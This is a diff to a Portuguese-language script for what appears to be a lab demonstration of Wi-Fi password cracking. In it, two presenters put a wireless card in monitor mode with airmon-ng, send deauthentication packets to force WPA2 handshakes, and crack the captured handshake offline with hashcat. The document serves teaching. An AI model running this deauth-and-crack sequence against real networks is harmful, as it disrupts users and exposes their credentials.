@@ -219,22 +219,46 @@ ping 192.168.100.1
 ```bash
 cd ~/Projects/HashCrackerLab
 source venv/bin/activate
+sudo airmon-ng check kill
+sudo airmon-ng start wlan0
 python wifi_cracker.py --capture --ssid LAB-SERVERS --interface wlan0mon
 ```
 
 ```
-[*] Modo monitor: wlan0mon
-[*] Escutando rede: LAB-SERVERS (Canal 6)
+[+] Interface em modo monitor!
+[*] Escaneando para encontrar BSSID...
+[+] Encontrado: LAB-SERVERS (AA:BB:CC:DD:EE:FF)
+[*] Capturando handshake...
 [*] Aguardando handshake WPA2...
 ```
 
 **HENRIQUE** (enquanto espera):
-> "O handshake WPA2 não contém a password diretamente, mas contém informação suficiente para a testar offline. Basta alguém ligar-se ao WiFi para o handshake ser gerado."
+> "Enquanto ele espera, vou explicar: o handshake WPA2 não contém a password diretamente, mas contém informação suficiente para a testar offline. Basta alguém ligar-se ao WiFi para o handshake ser gerado. O Ferro vai agora forçar isso com um deauth."
 
-*(Alguém desliga e liga o WiFi, ou Ferro envia deauth)*
+**FERRO** executa deauth (noutro terminal):
+```bash
+python wifi_cracker.py --deauth --ssid LAB-SERVERS --interface wlan0mon
+```
 
 ```
-[!] HANDSHAKE CAPTURADO! → hashes/wifi_sample.hc22000
+[*] Deauth Attack
+    Alvo:      AA:BB:CC:DD:EE:FF
+    Interface: wlan0mon
+    Pacotes:   5 × 3 rondas
+
+  [1/3] Enviando 5 deauth packets...
+  [2/3] Enviando 5 deauth packets...
+  [3/3] Enviando 5 deauth packets...
+
+[+] Deauth concluído — clientes devem reconectar (handshake gerado).
+```
+
+**HENRIQUE:**
+> "O deauth forçou todos os clientes a desligar-se. Quando reconectam automaticamente, o router gera um novo handshake e o Ferro captura-o."
+
+*(No primeiro terminal)*
+```
+[+] HANDSHAKE CAPTURADO! → hashes/wifi_sample.hc22000
 ```
 
 **HENRIQUE:**
@@ -242,12 +266,12 @@ python wifi_cracker.py --capture --ssid LAB-SERVERS --interface wlan0mon
 
 **FERRO** executa:
 ```bash
-python wifi_cracker.py --crack --hash hashes/wifi_sample.hc22000
+python wifi_cracker.py --crack hashes/wifi_sample.hc22000
 ```
 
 ```
 [*] Cracking WPA2 com hashcat mode 22000...
-[*] Wordlist: wordlists/rockyou.txt
+[*] Wordlist: wordlists/custom.txt
 [+] PASSWORD ENCONTRADA: Cibersegura
 [+] Tempo: 3.2 segundos
 ```
